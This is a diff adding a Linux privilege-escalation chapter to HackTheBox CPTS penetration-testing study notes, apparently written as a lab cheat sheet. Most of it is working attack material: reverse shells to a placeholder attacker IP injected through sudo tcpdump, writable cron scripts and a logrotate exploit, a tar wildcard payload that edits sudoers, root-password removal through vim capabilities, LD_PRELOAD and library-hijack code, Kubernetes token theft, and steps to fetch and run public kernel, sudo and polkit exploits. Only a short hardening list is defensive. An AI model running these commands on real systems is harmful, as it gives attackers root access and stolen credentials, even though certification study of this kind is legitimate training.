@@ -187,7 +187,44 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [IIS Tilde Enumeration](#iis-tilde-enumeration)
   - [LDAP](#ldap)
   - [Jenkins](#jenkins)
-- [13. Useful Resources](#13-useful-resources)
+- [13. Linux Privilege Escalation](#13-linux-privilege-escalation)
+  - [Quick Checks](#quick-checks)
+  - [Information Gathering](#information-gathering)
+    - [Environment Enumeration](#environment-enumeration)
+    - [Services & Internals Enumeration](#services--internals-enumeration)
+    - [Credential Hunting](#credential-hunting)
+  - [Environment-Based Privilege Escalation](#environment-based-privilege-escalation)
+    - [Path Abuse](#path-abuse)
+    - [Wildcard Abuse](#wildcard-abuse)
+    - [Escaping Restricted Shells](#escaping-restricted-shells)
+  - [Permissions-Based Privilege Escalation](#permissions-based-privilege-escalation)
+    - [Special Permissions (SUID/SGID)](#special-permissions-suidsgid)
+    - [Sudo Rights Abuse](#sudo-rights-abuse)
+    - [Privileged Groups](#privileged-groups)
+    - [Capabilities](#capabilities)
+  - [Service-Based Privilege Escalation](#service-based-privilege-escalation)
+    - [Vulnerable Services](#vulnerable-services)
+    - [Cron Job Abuse](#cron-job-abuse)
+    - [LXD](#lxd)
+    - [Docker](#docker)
+    - [Kubernetes](#kubernetes)
+    - [Logrotate](#logrotate)
+    - [Miscellaneous Techniques](#miscellaneous-techniques)
+  - [Linux Internals-Based Privilege Escalation](#linux-internals-based-privilege-escalation)
+    - [Kernel Exploits](#kernel-exploits)
+    - [Shared Libraries (LD_PRELOAD)](#shared-libraries-ld_preload)
+    - [Shared Object Hijacking](#shared-object-hijacking)
+    - [Python Library Hijacking](#python-library-hijacking)
+  - [Recent 0-Days](#recent-0-days)
+    - [Sudo — CVE-2021-3156 (Baron Samedit)](#sudo--cve-2021-3156-baron-samedit)
+    - [Sudo Policy Bypass — CVE-2019-14287](#sudo-policy-bypass--cve-2019-14287)
+    - [Polkit — CVE-2021-4034 (PwnKit)](#polkit--cve-2021-4034-pwnkit)
+    - [Dirty Pipe — CVE-2022-0847](#dirty-pipe--cve-2022-0847)
+    - [Netfilter](#netfilter)
+  - [Hardening Considerations](#hardening-considerations)
+  - [Skills Assessment](#skills-assessment)
+  - [References](#references)
+- [14. Useful Resources](#14-useful-resources)
 
 </details>
 
@@ -2925,7 +2962,670 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > bac
 
 ```
 
-## 13. Useful Resources
+## 13. Linux Privilege Escalation
+
+> Condensed from HackTheBox Academy **Linux Privilege Escalation** (module 51). This is a command-oriented reference, not a copy of the course text. Lab credentials, hashes, flags, and assessment answers are intentionally omitted — replace placeholders such as `<ATTACKER_IP>`, `<TARGET>`, `<USER>`, and `<PASSWORD>` before use.
+
+### Quick Checks
+
+```bash
+id
+sudo -l
+uname -a
+cat /etc/os-release
+hostname
+ps aux
+ss -tulpn
+
+# SUID / SGID binaries
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -6000 -type f 2>/dev/null
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Cron
+ls -la /etc/cron* /var/spool/cron 2>/dev/null
+cat /etc/crontab
+
+# Writable files and directories
+find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null
+find / -path /proc -prune -o -type d -perm -o+w -print 2>/dev/null
+```
+
+Automated helpers: [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [LinEnum](https://github.com/rebootuser/LinEnum), [pspy](https://github.com/DominicBreuker/pspy), [GTFOBins](https://gtfobins.github.io/).
+
+### Information Gathering
+
+#### Environment Enumeration
+
+```bash
+# OS, kernel, and architecture
+cat /etc/os-release
+uname -a
+lscpu
+
+# Current user, groups, PATH, and environment
+id
+echo $PATH
+env
+cat /etc/shells
+
+# Users and groups
+cat /etc/passwd
+cat /etc/passwd | cut -f1 -d:
+grep "sh$" /etc/passwd
+cat /etc/group
+getent group sudo
+ls /home
+
+# Disks and mounts
+lsblk
+cat /etc/fstab
+cat /etc/fstab | grep -v "#" | column -t
+df -h
+
+# Network
+ip a
+route
+arp -a
+cat /etc/hosts
+
+# Hidden files and directories
+find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep "$USER"
+find / -type d -name ".*" -ls 2>/dev/null
+ls -l /tmp /var/tmp /dev/shm
+```
+
+#### Services & Internals Enumeration
+
+```bash
+# Logged-in and recent users
+w
+lastlog
+
+# Command history
+history
+find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null
+
+# Scheduled tasks
+ls -la /etc/cron.daily/ /etc/cron.d/ /var/spool/cron 2>/dev/null
+
+# Processes and command lines
+ps aux | grep root
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+
+# Installed packages, binaries, and sudo version
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+ls -l /bin /usr/bin/ /usr/sbin/
+sudo -V
+
+# Interesting files
+find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+
+# Cross-check installed binaries against GTFOBins
+for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
+  if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi
+done
+```
+
+#### Credential Hunting
+
+```bash
+# Configuration files that may contain secrets
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cnf" \) 2>/dev/null
+
+# Web application configuration (example: WordPress)
+grep 'DB_USER\|DB_PASSWORD' wp-config.php
+
+# Shell history and SSH material
+cat ~/.bash_history
+ls -la ~/.ssh
+cat ~/.ssh/known_hosts
+```
+
+Look in `/var/www`, mail spools, backups, database files, `.git` directories, and world-readable scripts. Check whether discovered credentials are reused for `su`, `sudo`, SSH, or other hosts.
+
+### Environment-Based Privilege Escalation
+
+#### Path Abuse
+
+```bash
+echo $PATH
+
+# If a privileged script or cron job calls a binary by name, place a malicious
+# binary earlier in PATH or in a writable PATH directory.
+PATH=.:$PATH
+export PATH
+```
+
+A `sudo` entry that calls a binary by a relative name (for example `cat` instead of `/bin/cat`) can also be abused this way. Check `sudo -l` for non-absolute paths.
+
+#### Wildcard Abuse
+
+Example: a root cron job runs `tar` with a wildcard inside a writable directory.
+
+```bash
+# Create files whose names become tar command-line options
+echo 'echo "<USER> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+
+# When cron runs: tar -zcf backup.tar.gz *
+sudo -l
+```
+
+The same idea applies to other tools that accept options from filenames (`rsync`, `chown`, `chmod`, etc.). Inspect the scheduled command and the tool's option parser.
+
+#### Escaping Restricted Shells
+
+Restricted shells (`rbash`, `rksh`, `rzsh`) limit command execution, `cd`, and environment changes. Try:
+
+```bash
+# Command substitution / injection
+ls -l `pwd`
+$(/bin/bash)
+
+# Chaining
+; /bin/bash
+| /bin/bash
+&& /bin/bash
+& /bin/bash
+
+# Environment-based escapes
+export PATH=/bin:/usr/bin
+BASH_ENV=/bin/bash
+```
+
+Also try shell functions, editor escapes (`vi`, `vim`), pagers (`less`, `more`), and programs that can spawn a shell (`awk`, `find`, `python`, `perl`, `ruby`, `lua`).
+
+### Permissions-Based Privilege Escalation
+
+#### Special Permissions (SUID/SGID)
+
+```bash
+# SUID binaries owned by root
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+# SGID binaries
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+
+# Alternative enumeration
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+```
+
+For each result, check [GTFOBins](https://gtfobins.github.io/) for a shell or file-read technique. Example:
+
+```bash
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+```
+
+#### Sudo Rights Abuse
+
+```bash
+sudo -l
+```
+
+Look for `NOPASSWD`, `SETENV`, wildcards, relative paths, and commands with dangerous options. Example: `tcpdump` with `-z postrotate-command`:
+
+```bash
+# Payload executed by tcpdump as root
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f' > /tmp/.test
+
+sudo tcpdump -ln -i <INTERFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+Other common paths: `sudo` entries for editors, pagers, interpreters, `find`, `awk`, `tar`, `rsync`, `git`, and service restart commands. Check GTFOBins for the exact binary.
+
+#### Privileged Groups
+
+```bash
+id
+```
+
+- **lxd** — full LXD commands are in the LXD section below.
+- **docker** — equivalent to root on the host; see the Docker section.
+- **disk** — raw disk access with `debugfs`:
+  ```bash
+  debugfs /dev/sda1
+  ```
+- **adm** — read logs in `/var/log`:
+  ```bash
+  grep -Ri "password\|passwd\|token" /var/log 2>/dev/null
+  ```
+- **sudo** — `sudo -l`.
+- **shadow** — read `/etc/shadow` directly.
+
+#### Capabilities
+
+```bash
+# Enumerate capabilities on common binary directories
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+getcap -r / 2>/dev/null
+
+# Example: cap_dac_override on vim
+getcap /usr/bin/vim.basic
+/usr/bin/vim.basic /etc/passwd
+
+# Non-interactive: remove the root password field, then su without a password
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+su root
+```
+
+Dangerous capabilities to look for: `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_dac_override`, `cap_sys_ptrace`, `cap_sys_module`.
+
+For `cap_setuid` on an interpreter:
+
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
+```
+
+### Service-Based Privilege Escalation
+
+#### Vulnerable Services
+
+```bash
+# Example: Screen 4.5.0
+screen -v
+# Search for a public exploit/PoC for the installed version
+searchsploit screen 4.5.0
+```
+
+The module's Screen exploit overwrites `/etc/ld.so.preload` to load a malicious shared object as root. Only run public exploits after understanding their impact; they can crash the target.
+
+#### Cron Job Abuse
+
+```bash
+# Find world-writable files (candidate cron scripts)
+find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null
+
+# Inspect the script and its schedule
+ls -la /dmz-backups/
+cat /dmz-backups/backup.sh
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/
+
+# Watch processes and file-system events without root
+./pspy64 -pf -i 1000
+```
+
+If a root-owned cron script is writable, append a reverse shell (keep the original script working first):
+
+```bash
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1' >> /path/to/backup.sh
+nc -lvnp 443
+```
+
+#### LXD
+
+```bash
+id    # confirm membership in the lxd group
+
+lxd init
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc init alpine r00t -c security.privileged=true
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc start r00t
+lxc exec r00t /bin/sh
+```
+
+Inside the container, the host filesystem is mounted under `/mnt/root`.
+
+#### Docker
+
+```bash
+id
+docker image ls
+
+# docker group: mount the host root filesystem
+docker run -v /root:/mnt -it ubuntu
+
+# Writable Docker socket on the host
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+
+Inside a container with a writable Docker socket and the `docker` client:
+
+```bash
+ls -al /app/docker.sock
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
+```
+
+#### Kubernetes
+
+```bash
+# API server and Kubelet discovery
+curl https://<K8S_API>:6443 -k
+curl https://<KUBELET>:10250/pods -k | jq .
+
+# kubeletctl enumeration and RCE
+kubeletctl -i --server <KUBELET> pods
+kubeletctl -i --server <KUBELET> scan rce
+kubeletctl -i --server <KUBELET> exec "id" -p <POD> -c <CONTAINER>
+
+# Extract the service-account token and CA certificate
+kubeletctl -i --server <KUBELET> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER> | tee -a k8.token
+kubeletctl --server <KUBELET> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <CONTAINER> | tee -a ca.crt
+
+# Check permissions with the stolen token
+export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 auth can-i --list
+```
+
+If the token can create pods, deploy a privileged pod that mounts the host root:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+```bash
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 apply -f privesc.yaml
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<K8S_API>:6443 get pods
+```
+
+#### Logrotate
+
+Requirements: write access to a log file, `logrotate` running as root, and a vulnerable version (for example 3.8.6, 3.11.0, 3.15.0, 3.18.0).
+
+```bash
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1' > payload
+./logrotten -p ./payload /tmp/tmp.log
+```
+
+```bash
+nc -nlvp 9001
+```
+
+#### Miscellaneous Techniques
+
+Passive traffic capture:
+
+```bash
+sudo tcpdump -i any -A -s 0
+# Analyze a capture with net-creds or PCredz
+```
+
+Weak NFS exports (`no_root_squash`):
+
+```bash
+showmount -e <TARGET>
+cat /etc/exports
+
+# On the attack host: build a SUID shell and place it on the export
+cat > shell.c <<'EOF'
+#include <stdio.h>
+#include <unistd.h>
+int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
+EOF
+gcc shell.c -o shell
+
+sudo mount -t nfs <TARGET>:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+
+# On the target
+/tmp/shell
+```
+
+Tmux session hijacking:
+
+```bash
+ps aux | grep tmux
+ls -la /shareds
+tmux -S /shareds
+```
+
+### Linux Internals-Based Privilege Escalation
+
+#### Kernel Exploits
+
+```bash
+uname -a
+cat /etc/lsb-release
+```
+
+Search for the kernel version, compile a public PoC, and run it:
+
+```bash
+gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
+./kernel_exploit
+```
+
+Kernel exploits can crash or destabilize the target. Prefer a PoC matching the exact kernel and distribution.
+
+#### Shared Libraries (LD_PRELOAD)
+
+```bash
+sudo -l    # look for env_keep+=LD_PRELOAD
+ldd /bin/ls
+```
+
+`root.c`:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+```bash
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+
+#### Shared Object Hijacking
+
+```bash
+ls -la payroll
+ldd payroll
+readelf -d payroll | grep PATH
+ls -la /development/
+```
+
+If the binary loads a library from a writable `RUNPATH` and calls a function such as `dbquery`, create a malicious library exporting that symbol:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void dbquery() {
+    setuid(0);
+    system("/bin/sh -p");
+}
+```
+
+```bash
+gcc src.c -fPIC -shared -o /development/libshared.so
+./payroll
+```
+
+#### Python Library Hijacking
+
+```bash
+sudo -l
+python3 -c 'import sys; print("\n".join(sys.path))'
+pip3 show psutil
+ls -la /usr/lib/python3.8
+```
+
+1. **Insecure module permissions** — edit the imported function directly:
+   ```python
+   def virtual_memory():
+       import os
+       os.system('id')
+       # ... original code ...
+   ```
+   ```bash
+   sudo /usr/bin/python3 ./mem_status.py
+   ```
+
+2. **Library search path** — create a module with the same name earlier in `sys.path`:
+   ```python
+   # psutil.py
+   import os
+   def virtual_memory():
+       os.system('id')
+   ```
+   ```bash
+   sudo /usr/bin/python3 mem_status.py
+   ```
+
+3. **PYTHONPATH** — if `sudo -l` shows `SETENV`, point Python at a writable directory:
+   ```bash
+   sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+   ```
+
+### Recent 0-Days
+
+#### Sudo — CVE-2021-3156 (Baron Samedit)
+
+```bash
+sudo -V | head -n1
+
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich 1
+```
+
+#### Sudo Policy Bypass — CVE-2019-14287
+
+Requires a `sudoers` entry that permits a specific command for any user (`ALL=(ALL) /usr/bin/id`), and sudo below 1.8.28.
+
+```bash
+sudo -l
+sudo -u#-1 id
+```
+
+#### Polkit — CVE-2021-4034 (PwnKit)
+
+```bash
+pkexec -u root id
+
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc
+```
+
+#### Dirty Pipe — CVE-2022-0847
+
+Affects Linux kernels 5.8 through 5.17.
+
+```bash
+uname -r
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+
+./exploit-1
+find / -perm -4000 2>/dev/null
+./exploit-2 /usr/bin/sudo
+```
+
+#### Netfilter
+
+```bash
+uname -r
+```
+
+CVE-2021-22555 (kernels 2.6 – 5.11):
+
+```bash
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+gcc -m32 -static exploit.c -o exploit
+./exploit
+```
+
+CVE-2022-25636 (kernels 5.4 – 5.6.10):
+
+```bash
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+cd CVE-2022-25636
+make
+./exploit
+```
+
+CVE-2023-32233 (kernels up to 6.3.1):
+
+```bash
+git clone https://github.com/Liuk3r/CVE-2023-32233
+cd CVE-2023-32233
+gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+./exploit
+```
+
+These exploits can corrupt the kernel and require a reboot. Use them only when the target matches the affected range.
+
+### Hardening Considerations
+
+- **Patch** kernels, `sudo`, container runtimes, and installed packages; use `unattended-upgrades` (Debian/Ubuntu) or `yum-cron` (RHEL).
+- **Audit** SUID/SGID binaries, writable files, cron jobs, and library paths.
+- **Use absolute paths** in `sudoers` and cron entries.
+- **Do not store cleartext credentials** in world-readable files.
+- **Restrict privileged groups** (`sudo`, `docker`, `lxd`, `disk`, `adm`, `shadow`).
+- **Apply least privilege** to `sudo` rights and service accounts.
+- **Protect custom libraries and Python modules** from low-privileged writes.
+- **Remove unnecessary packages and services** to reduce attack surface.
+- **Enable SELinux or AppArmor**, monitor logs, and use auditing.
+- Run a baseline audit:
+  ```bash
+  ./lynis audit system
+  ```
+
+### Skills Assessment
+
+The module's skills assessment is intentionally not summarized here. Complete it directly in the HTB Academy lab.
+
+### References
+
+- [HTB Academy — Linux Privilege Escalation](https://academy.hackthebox.com/app/module/51)
+- [GTFOBins](https://gtfobins.github.io/)
+- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+- [pspy](https://github.com/DominicBreuker/pspy)
+- [Payloads All The Things — Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+
+## 14. Useful Resources
 
 [HackTricks](https://book.hacktricks.xyz/)
 
